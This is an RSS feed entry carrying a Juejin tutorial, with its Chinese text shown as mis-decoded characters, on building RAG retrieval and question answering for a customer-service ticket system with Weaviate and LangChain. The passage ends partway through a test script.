<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[25-å®¢æœå·¥å•ç³»ç»Ÿå®æˆ˜ï¼ˆäºŒï¼‰ï¼šRAGæ£€ç´¢ä¸æ™ºèƒ½é—®ç­”]]></title>    <link>https://juejin.cn/post/7589919989039087679</link>    <guid>https://juejin.cn/post/7589919989039087679</guid>    <pubDate>2026-01-02T12:17:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589919989039087679" data-draft-id="7589940210832130091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="25-å®¢æœå·¥å•ç³»ç»Ÿå®æˆ˜ï¼ˆäºŒï¼‰ï¼šRAGæ£€ç´¢ä¸æ™ºèƒ½é—®ç­”"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T12:17:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kevin_kang"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824720670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            25-å®¢æœå·¥å•ç³»ç»Ÿå®æˆ˜ï¼ˆäºŒï¼‰ï¼šRAGæ£€ç´¢ä¸æ™ºèƒ½é—®ç­”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824720670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kevin_kang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T12:17:37.000Z" title="Fri Jan 02 2026 12:17:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®¢æœå·¥å•ç³»ç»Ÿå®æˆ˜ï¼ˆäºŒï¼‰ï¼šRAGæ£€ç´¢ä¸æ™ºèƒ½é—®ç­”</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å®Œæˆäº†å·¥å•æ•°æ®çš„å¯¼å…¥å’Œå‘é‡åŒ–å­˜å‚¨ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•åŸºäºè¿™äº›å‘é‡æ•°æ®ï¼Œå®ç°æ™ºèƒ½æ£€ç´¢å’Œé—®ç­”åŠŸèƒ½ï¼Œè®©AIèƒ½å¤Ÿæ ¹æ®å†å²å·¥å•è‡ªåŠ¨æ¨èè§£å†³æ–¹æ¡ˆã€‚</p>
<p><strong>æœ¬æ–‡åŸºäºçœŸå®é¡¹ç›®ä»£ç </strong>ï¼Œæ‰€æœ‰ç¤ºä¾‹å‡å¯åœ¨GitHubä»“åº“ä¸­æ‰¾åˆ°å¯¹åº”å®ç°ã€‚</p>
<p><strong>é€‚åˆè¯»è€…ï¼š</strong> AIå·¥ç¨‹å¸ˆã€åç«¯å¼€å‘è€…ã€å…¨æ ˆå·¥ç¨‹å¸ˆ</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€RAGå·¥ä½œåŸç†</h3>
<h4 data-id="heading-3">1.1 ä¼ ç»ŸLLM vs RAG</h4>
<pre><code class="hljs">ä¼ ç»ŸLLMï¼š
ç”¨æˆ·é—®é¢˜ â†’ LLM â†’ ç­”æ¡ˆ
é—®é¢˜ï¼šçŸ¥è¯†æœ‰é™ã€å¯èƒ½è¿‡æ—¶ã€å®¹æ˜“å¹»è§‰

RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ï¼š
ç”¨æˆ·é—®é¢˜ â†’ å‘é‡æ£€ç´¢ â†’ ç›¸å…³å·¥å• â†’ ç»„è£…Prompt â†’ LLM â†’ ç­”æ¡ˆ
ä¼˜åŠ¿ï¼šçŸ¥è¯†å¯æ›´æ–°ã€ç­”æ¡ˆæ›´å‡†ç¡®ã€æœ‰æ®å¯æŸ¥
</code></pre>
<h4 data-id="heading-4">1.2 å®Œæ•´æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ç”¨æˆ·æé—®ï¼š"ç‰©æµä¿¡æ¯5å¤©æ²¡æ›´æ–°æ€ä¹ˆåŠï¼Ÿ"
   â†“
<span class="hljs-bullet">2.</span> å‘é‡åŒ–é—®é¢˜ â†’ [0.23, -0.45, 0.67, ...]
   â†“
<span class="hljs-bullet">3.</span> Weaviateæ£€ç´¢ â†’ Top-5ç›¸ä¼¼å·¥å•
   â†“
<span class="hljs-bullet">4.</span> ç»„è£…Promptï¼ˆé—®é¢˜ + å†å²å·¥å•ï¼‰
   â†“
<span class="hljs-bullet">5.</span> LLMç”Ÿæˆç­”æ¡ˆ
   â†“
<span class="hljs-bullet">6.</span> è¿”å›ç­”æ¡ˆ + æ¥æºå·¥å•
</code></pre>
<hr/>
<h3 data-id="heading-5">äºŒã€å‘é‡æ£€ç´¢å®ç°</h3>
<h4 data-id="heading-6">2.1 ç›¸ä¼¼åº¦æœç´¢</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># agent/ticket_agent.py</span>
<span class="hljs-keyword">from</span> langchain_core.documents <span class="hljs-keyword">import</span> Document
<span class="hljs-keyword">import</span> weaviate.classes <span class="hljs-keyword">as</span> wvc

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_search_similar_documents</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, k: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-type">List</span>[Document]:
        <span class="hljs-string">"""æœç´¢ç›¸ä¼¼å·¥å•"""</span>
        <span class="hljs-comment"># 1. ç”ŸæˆæŸ¥è¯¢å‘é‡</span>
        query_vector = self.embeddings.embed_query(query)
        
        <span class="hljs-comment"># 2. åœ¨Weaviateä¸­æœç´¢</span>
        response = self.collection.query.near_vector(
            near_vector=query_vector,
            limit=k,
            return_metadata=wvc.query.MetadataQuery(distance=<span class="hljs-literal">True</span>)
        )
        
        <span class="hljs-comment"># 3. è½¬æ¢ä¸ºDocumentæ ¼å¼</span>
        documents = []
        <span class="hljs-keyword">for</span> obj <span class="hljs-keyword">in</span> response.objects:
            doc = Document(
                page_content=obj.properties[<span class="hljs-string">'content'</span>],
                metadata={
                    <span class="hljs-string">'ticket_id'</span>: obj.properties.get(<span class="hljs-string">'ticket_id'</span>, <span class="hljs-string">''</span>),
                    <span class="hljs-string">'issue_type'</span>: obj.properties.get(<span class="hljs-string">'issue_type'</span>, <span class="hljs-string">''</span>),
                    <span class="hljs-string">'priority'</span>: obj.properties.get(<span class="hljs-string">'priority'</span>, <span class="hljs-string">''</span>),
                    <span class="hljs-string">'status'</span>: obj.properties.get(<span class="hljs-string">'status'</span>, <span class="hljs-string">''</span>),
                    <span class="hljs-string">'distance'</span>: obj.metadata.distance <span class="hljs-keyword">if</span> obj.metadata <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
                }
            )
            documents.append(doc)
        
        <span class="hljs-keyword">return</span> documents
</code></pre>
<h4 data-id="heading-7">2.2 æ£€ç´¢æµ‹è¯•</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æµ‹è¯•æ£€ç´¢åŠŸèƒ½</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_search</span>():
    agent = ServiceTicketAgent()
    
    <span class="hljs-comment"># æµ‹è¯•é—®é¢˜</span>
    question = <span class="hljs-string">"ç‰©æµä¿¡æ¯5å¤©æ²¡æ›´æ–°ï¼Œæ€ä¹ˆå¤„ç†ï¼Ÿ"</span>
    
    <span class="hljs-comment"># æ£€ç´¢ç›¸ä¼¼å·¥å•</span>
    docs = agent._search_similar_documents(question, k=<span class="hljs-number">5</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ£€ç´¢åˆ° <span class="hljs-subst">{<span class="hljs-built_in">len</span>(docs)}</span> æ¡ç›¸å…³å·¥å•ï¼š\n"</span>)
    <span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(docs, <span class="hljs-number">1</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å·¥å• <span class="hljs-subst">{i}</span>:"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ID: <span class="hljs-subst">{doc.metadata[<span class="hljs-string">'ticket_id'</span>]}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ç±»å‹: <span class="hljs-subst">{doc.metadata[<span class="hljs-string">'issue_type'</span>]}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  è·ç¦»: <span class="hljs-subst">{doc.metadata[<span class="hljs-string">'distance'</span>]:<span class="hljs-number">.4</span>f}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  å†…å®¹: <span class="hljs-subst">{doc.page_content[:<span class="hljs-number">100</span>]}</span>..."</span>)
        <span class="hljs-built_in">print</span>()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    test_search()
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">æ£€ç´¢åˆ° 5 æ¡ç›¸å…³å·¥å•ï¼š

å·¥å• 1:
  ID: TK011
  ç±»å‹: è®¢å•æŸ¥è¯¢
  è·ç¦»: 0.1234
  å†…å®¹: å·¥å•ç¼–å·: TK011
<span class="hljs-section">é—®é¢˜ç±»å‹: è®¢å•æŸ¥è¯¢</span>
<span class="hljs-section">é—®é¢˜æè¿°: è®¢å•å·²å‘è´§5å¤©ä½†ç‰©æµä¿¡æ¯æœªæ›´æ–°ï¼Œæ‹…å¿ƒåŒ…è£¹ä¸¢å¤±...</span>

å·¥å• 2:
  ID: TK006
  ç±»å‹: ç‰©æµé—®é¢˜
  è·ç¦»: 0.2456
  å†…å®¹: å·¥å•ç¼–å·: TK006
<span class="hljs-section">é—®é¢˜ç±»å‹: ç‰©æµé—®é¢˜</span>
<span class="hljs-section">é—®é¢˜æè¿°: å¿«é€’æ˜¾ç¤ºå·²ç­¾æ”¶ä½†æœ¬äººæœªæ”¶åˆ°è´§ç‰©...</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€Promptå·¥ç¨‹</h3>
<h4 data-id="heading-9">3.1 Promptæ¨¡æ¿è®¾è®¡</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># agent/config.py</span>
QA_PROMPT_TEMPLATE = <span class="hljs-string">"""ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å®¢æœåŠ©æ‰‹ï¼Œæ“…é•¿æ ¹æ®å†å²å·¥å•æä¾›è§£å†³æ–¹æ¡ˆã€‚

ä»¥ä¸‹æ˜¯ç›¸å…³çš„å†å²å·¥å•è®°å½•ï¼š

{context}

å®¢æˆ·é—®é¢˜ï¼š{question}

è¯·åŸºäºä»¥ä¸Šå†å²å·¥å•ï¼Œä¸ºå®¢æˆ·æä¾›ä¸“ä¸šçš„è§£å†³æ–¹æ¡ˆã€‚è¦æ±‚ï¼š
1. å¦‚æœæ‰¾åˆ°ç›¸å…³è§£å†³æ–¹æ¡ˆï¼Œè¯·è¯¦ç»†è¯´æ˜å¤„ç†æ­¥éª¤
2. å¦‚æœå†å²å·¥å•ä¸­æ²¡æœ‰å®Œå…¨åŒ¹é…çš„æ¡ˆä¾‹ï¼Œå¯ä»¥ç»¼åˆå¤šä¸ªç›¸ä¼¼æ¡ˆä¾‹ç»™å‡ºå»ºè®®
3. ä¿æŒå‹å¥½ã€ä¸“ä¸šçš„è¯­æ°”
4. å¦‚æœç¡®å®æ— æ³•è§£å†³ï¼Œå»ºè®®å®¢æˆ·è”ç³»äººå·¥å®¢æœ

å›ç­”ï¼š"""</span>
</code></pre>
<h4 data-id="heading-10">3.2 åŠ¨æ€Promptç»„è£…</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> PromptTemplate

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_setup_components</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># åˆå§‹åŒ–Promptæ¨¡æ¿</span>
        self.prompt_template = PromptTemplate(
            input_variables=[<span class="hljs-string">"context"</span>, <span class="hljs-string">"question"</span>],
            template=config.QA_PROMPT_TEMPLATE
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_format_context</span>(<span class="hljs-params">self, docs: <span class="hljs-type">List</span>[Document]</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""æ ¼å¼åŒ–ä¸Šä¸‹æ–‡"""</span>
        context_parts = []
        
        <span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(docs, <span class="hljs-number">1</span>):
            context_parts.append(<span class="hljs-string">f"ã€å†å²å·¥å• <span class="hljs-subst">{i}</span>ã€‘\n<span class="hljs-subst">{doc.page_content}</span>"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"\n\n"</span>.join(context_parts)
</code></pre>
<hr/>
<h3 data-id="heading-11">å››ã€LCELé—®ç­”é“¾</h3>
<h4 data-id="heading-12">4.1 æ„å»ºé—®ç­”é“¾</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnablePassthrough
<span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> StrOutputParser

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_setup_qa_chain</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¾ç½®é—®ç­”é“¾ï¼ˆLCELï¼‰"""</span>
        
        <span class="hljs-comment"># å®šä¹‰æ ¼å¼åŒ–å‡½æ•°</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">format_docs</span>(<span class="hljs-params">docs</span>):
            <span class="hljs-keyword">return</span> <span class="hljs-string">"\n\n"</span>.join(doc.page_content <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs)
        
        <span class="hljs-comment"># å®šä¹‰æ£€ç´¢å’Œæ ¼å¼åŒ–å‡½æ•°</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve_and_format</span>(<span class="hljs-params">question</span>):
            docs = self._search_similar_documents(question)
            <span class="hljs-keyword">return</span> format_docs(docs)
        
        <span class="hljs-comment"># ä½¿ç”¨LCELæ„å»ºé“¾</span>
        self.qa_chain = (
            {
                <span class="hljs-string">"context"</span>: retrieve_and_format,
                <span class="hljs-string">"question"</span>: RunnablePassthrough()
            }
            | self.prompt_template
            | self.llm
            | StrOutputParser()
        )
        
        <span class="hljs-keyword">return</span> self.qa_chain
</code></pre>
<h4 data-id="heading-13">4.2 LCELä¼˜åŠ¿</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># LCELçš„ä¼˜åŠ¿ï¼š</span>
<span class="hljs-comment"># 1. ç®€æ´ä¼˜é›… - ä½¿ç”¨ç®¡é“æ“ä½œç¬¦ |</span>
<span class="hljs-comment"># 2. ç±»å‹å®‰å…¨ - è‡ªåŠ¨ç±»å‹æ£€æŸ¥</span>
<span class="hljs-comment"># 3. æµå¼æ”¯æŒ - å¤©ç„¶æ”¯æŒstream</span>
<span class="hljs-comment"># 4. å¹¶è¡Œæ‰§è¡Œ - è‡ªåŠ¨ä¼˜åŒ–æ‰§è¡Œé¡ºåº</span>

<span class="hljs-comment"># ä¼ ç»Ÿæ–¹å¼ï¼ˆå¤æ‚ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">old_way</span>(<span class="hljs-params">question</span>):
    docs = search(question)
    context = <span class="hljs-built_in">format</span>(docs)
    prompt = template.<span class="hljs-built_in">format</span>(context=context, question=question)
    answer = llm.invoke(prompt)
    <span class="hljs-keyword">return</span> parse(answer)

<span class="hljs-comment"># LCELæ–¹å¼ï¼ˆç®€æ´ï¼‰</span>
chain = retriever | <span class="hljs-built_in">format</span> | prompt | llm | parser
answer = chain.invoke(question)
</code></pre>
<hr/>
<h3 data-id="heading-14">äº”ã€éæµå¼é—®ç­”</h3>
<h4 data-id="heading-15">5.1 å®Œæ•´å®ç°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># agent/ticket_agent.py</span>
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> .response <span class="hljs-keyword">import</span> success_response, error_response, AgentErrorCode

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ask</span>(<span class="hljs-params">self, question: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Dict</span>:
        <span class="hljs-string">"""
        å®Œæ•´çš„æ™ºèƒ½é—®ç­”æµç¨‹
        
        è¿”å›æ ¼å¼:
        {
            "code": 0,
            "msg": "success",
            "data": {
                "answer": "ç­”æ¡ˆæ–‡æœ¬",
                "sources": [...],
                "metadata": {...}
            }
        }
        """</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®¢æœé—®é¢˜: <span class="hljs-subst">{question}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        
        start_time = time.time()
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 1. å‚æ•°éªŒè¯</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> question <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> question.strip():
                <span class="hljs-keyword">return</span> error_response(
                    code=AgentErrorCode.QUESTION_FORMAT_ERROR,
                    msg=<span class="hljs-string">"é—®é¢˜ä¸èƒ½ä¸ºç©º"</span>
                )
            
            <span class="hljs-comment"># 2. è®¾ç½®é—®ç­”é“¾</span>
            qa_chain = self._setup_qa_chain()
            
            <span class="hljs-comment"># 3. æ£€ç´¢ç›¸å…³å·¥å•</span>
            <span class="hljs-keyword">try</span>:
                source_docs = self._search_similar_documents(question)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-keyword">return</span> error_response(
                    code=AgentErrorCode.RAG_RETRIEVAL_ERROR,
                    msg=<span class="hljs-string">"å‘é‡æ£€ç´¢å¤±è´¥"</span>,
                    error_detail=<span class="hljs-built_in">str</span>(e)
                )
            
            <span class="hljs-comment"># 4. æ£€æŸ¥æ˜¯å¦æœ‰ç›¸å…³ç»“æœ</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_docs:
                <span class="hljs-keyword">return</span> error_response(
                    code=AgentErrorCode.NO_RELEVANT_RESULTS,
                    msg=<span class="hljs-string">"æœªæ‰¾åˆ°ç›¸å…³å·¥å•è®°å½•"</span>
                )
            
            <span class="hljs-comment"># 5. æ˜¾ç¤ºæ£€ç´¢åˆ°çš„å·¥å•</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ£€ç´¢åˆ° <span class="hljs-subst">{<span class="hljs-built_in">len</span>(source_docs)}</span> æ¡ç›¸å…³å·¥å•:"</span>)
            sources = []
            <span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(source_docs, <span class="hljs-number">1</span>):
                metadata = doc.metadata
                ticket_id = metadata.get(<span class="hljs-string">'ticket_id'</span>, <span class="hljs-string">'Unknown'</span>)
                issue_type = metadata.get(<span class="hljs-string">'issue_type'</span>, <span class="hljs-string">'Unknown'</span>)
                priority = metadata.get(<span class="hljs-string">'priority'</span>, <span class="hljs-string">'Unknown'</span>)
                distance = metadata.get(<span class="hljs-string">'distance'</span>)
                
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - <span class="hljs-subst">{ticket_id}</span> (<span class="hljs-subst">{issue_type}</span>) [ä¼˜å…ˆçº§: <span class="hljs-subst">{priority}</span>]"</span>)
                
                sources.append({
                    <span class="hljs-string">"ticket_id"</span>: ticket_id,
                    <span class="hljs-string">"issue_type"</span>: issue_type,
                    <span class="hljs-string">"priority"</span>: priority,
                    <span class="hljs-string">"status"</span>: metadata.get(<span class="hljs-string">'status'</span>, <span class="hljs-string">'Unknown'</span>),
                    <span class="hljs-string">"score"</span>: <span class="hljs-number">1</span> - distance <span class="hljs-keyword">if</span> distance <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
                })
            
            <span class="hljs-comment"># 6. æ‰§è¡Œé—®ç­”</span>
            <span class="hljs-keyword">try</span>:
                answer = qa_chain.invoke(question)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-keyword">return</span> error_response(
                    code=AgentErrorCode.LLM_CALL_ERROR,
                    msg=<span class="hljs-string">"AI æ¨¡å‹è°ƒç”¨å¤±è´¥"</span>,
                    error_detail=<span class="hljs-built_in">str</span>(e)
                )
            
            <span class="hljs-comment"># 7. è®¡ç®—å¤„ç†æ—¶é—´</span>
            query_time = <span class="hljs-built_in">round</span>(time.time() - start_time, <span class="hljs-number">2</span>)
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"AI å›ç­”: <span class="hljs-subst">{answer}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤„ç†æ—¶é—´: <span class="hljs-subst">{query_time}</span>ç§’"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            
            <span class="hljs-comment"># 8. è¿”å›æˆåŠŸå“åº”</span>
            <span class="hljs-keyword">return</span> success_response(
                answer=answer,
                sources=sources[:<span class="hljs-number">5</span>],
                metadata={
                    <span class="hljs-string">"query_time"</span>: query_time,
                    <span class="hljs-string">"retrieved_docs"</span>: <span class="hljs-built_in">len</span>(source_docs),
                    <span class="hljs-string">"model"</span>: self.chat_model,
                    <span class="hljs-string">"embed_model"</span>: self.embed_model
                }
            )
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> error_response(
                code=AgentErrorCode.AGENT_ERROR,
                msg=<span class="hljs-string">"Agent æœåŠ¡é”™è¯¯"</span>,
                error_detail=<span class="hljs-built_in">str</span>(e)
            )
</code></pre>
<h4 data-id="heading-16">5.2 æµ‹è¯•é—®ç­”</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># test_qa.py</span>
<span class="hljs-keyword">from</span> agent <span class="hljs-keyword">import</span> ServiceTicketAgent

<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_qa</span>():
    agent = ServiceTicketAgent()
    
    <span class="hljs-comment"># æµ‹è¯•é—®é¢˜åˆ—è¡¨</span>
    questions = [
        <span class="hljs-string">"ç‰©æµä¿¡æ¯5å¤©æ²¡æ›´æ–°ï¼Œæ€ä¹ˆå¤„ç†ï¼Ÿ"</span>,
        <span class="hljs-string">"å®¢æˆ·æƒ³é€€è´§ï¼Œå¦‚ä½•æ“ä½œï¼Ÿ"</span>,
